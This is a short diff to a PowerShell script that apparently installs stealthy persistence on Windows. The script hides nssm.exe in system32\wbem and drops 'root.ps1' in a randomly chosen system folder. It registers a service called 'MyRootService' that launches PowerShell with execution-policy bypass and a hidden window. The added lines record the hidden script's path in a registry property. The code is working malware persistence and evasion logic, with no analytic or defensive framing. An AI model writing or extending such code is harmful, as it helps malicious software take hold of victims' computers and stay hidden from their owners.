@@ -8,6 +8,7 @@ $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
 $serviceName = "MyRootService"
 $downloadPath = "$env:temp\nssm.zip"
+$propertyName = "root"
 $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
     "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
@@ -18,10 +19,11 @@ if(($rootScriptPath -eq $null) -or ($rootScriptPath -eq "")){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
     $rootScriptPath = $paths[$idx]
     $rootScriptPath = "$rootScriptPath\root.ps1"
+    Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootScriptPath -Force | Out-Null
 }
 
 $exePath = "powershell.exe"
-$arguments = "-ep bypass -noP -w hidden $rootScriptPath -basePath $basePath"
+$arguments = "-ep bypass -noP -w hidden $rootScriptPath -basePath '$basePath'"
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
     New-Item -Path $nssmFolder -ItemType Directory -Force
